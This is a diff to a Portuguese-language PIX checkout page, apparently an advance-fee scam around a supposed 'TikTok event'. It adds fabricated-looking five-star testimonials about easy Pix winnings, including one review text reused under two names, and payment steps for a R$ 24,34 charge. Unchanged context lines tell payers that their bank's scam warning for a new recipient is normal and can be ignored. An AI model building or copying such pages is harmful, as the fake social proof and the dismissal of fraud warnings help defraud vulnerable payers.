@@ -219,7 +219,7 @@
                     Pagamento seguro via PIX com aprovação imediata.
                 </p>
 
-                <!-- Carrossel depoimentos (etapa 1) -->
+                <!-- Carrossel depoimentos (etapa 1) com 4 reviews -->
                 <div class="co-reviews-carousel">
                     <div class="co-reviews-track">
                         <div class="co-review-card">
@@ -242,6 +242,26 @@
                             </div>
                             <p class="co-review-text">"Familia ta funcionando de mais pingou na hora o pix 💸🏆"</p>
                         </div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588828370-photo_2025-08-30_18-12-16.webp" alt="Caio" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Caio</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Lancei minha moto e dei um iPhone pra minha Coroa, o Tiktok acertou de mais nesse evento 🔥"</p>
+                        </div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588864250-photo_2025-08-30_18-12-28.webp" alt="Ana" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Ana</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Genteeeeee, não acredito que funcionou, caiu 500 no meu pix"</p>
+                        </div>
                     </div>
                 </div>
             </div><!-- fim co-step-1 -->
@@ -261,7 +281,7 @@
                     <div class="co-divider"></div>
                     <div class="co-price-row">
                         <span class="co-price-label">Total</span>
-                        <span class="co-price-value">R$ 24,34</span>
+                        <span class="co-price-value" id="co-price-display">R$ 24,34</span>
                     </div>
                 </div>
 
@@ -275,7 +295,7 @@
                 <!-- Valor e código truncado -->
                 <div class="co-valor-pix-row">
                     <span class="co-valor-pix-label">Valor PIX:</span>
-                    <span class="co-valor-pix-value">R$ 24,34</span>
+                    <span class="co-valor-pix-value" id="pix-valor-display">R$ 24,34</span>
                 </div>
                 <div class="co-pix-key-truncated" id="pix-code-truncated"></div>
 
@@ -315,6 +335,76 @@
                     </div>
                     <p class="co-bank-alert-text">Alguns bancos mostram um aviso automático em qualquer Pix para um destinatário novo. Isso é normal e não significa que a compra é golpe. Confira os dados e conclua o pagamento com tranquilidade.</p>
                 </div>
+
+                <!-- Como pagar -->
+                <div class="co-how-to">
+                    <div class="co-how-to-title">Como pagar:</div>
+                    <div class="co-how-to-list">
+                        <div class="co-how-to-item">
+                            <div class="co-how-to-num">1</div>
+                            <span>Abra o aplicativo do seu banco e selecione a opção de pagamento PIX</span>
+                        </div>
+                        <div class="co-how-to-item">
+                            <div class="co-how-to-num">2</div>
+                            <span>Escolha pagar usando o código QR ou copie o código PIX acima</span>
+                        </div>
+                        <div class="co-how-to-item">
+                            <div class="co-how-to-num">3</div>
+                            <span>Confirme os detalhes do pagamento e o destinatário</span>
+                        </div>
+                        <div class="co-how-to-item">
+                            <div class="co-how-to-num">4</div>
+                            <span>Conclua o pagamento e guarde o comprovante (você será redirecionado automaticamente após o pagamento)</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Carrossel depoimentos na etapa 2 com 4 reviews -->
+                <div class="co-reviews-carousel">
+                    <div class="co-reviews-track">
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588828370-photo_2025-08-30_18-12-16.webp" alt="Caio" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Caio</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Lancei minha moto e dei um iPhone pra minha Coroa, o Tiktok acertou de mais nesse evento 🔥"</p>
+                        </div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588864250-photo_2025-08-30_18-12-28.webp" alt="Ana" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Ana</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Genteeeeee, não acredito que funcionou, caiu 500 no meu pix"</p>
+                        </div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588901009-photo_2025-08-30_18-12-20.webp" alt="Larissa" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Larissa</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Eu to amandoooo, fazendo muito dindin todo dia mdsss kkkk amooooo"</p>
+                        </div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756591742828-photo_2025-08-30_18-12-16.webp" alt="Lucas" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Lucas</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Familia ta funcionando de mais pingou na hora o pix 💸🏆"</p>
+                        </div>
+                    </div>
+                </div>
+
             </div><!-- fim co-step-2 -->
 
         </div><!-- fim co-page-bg -->
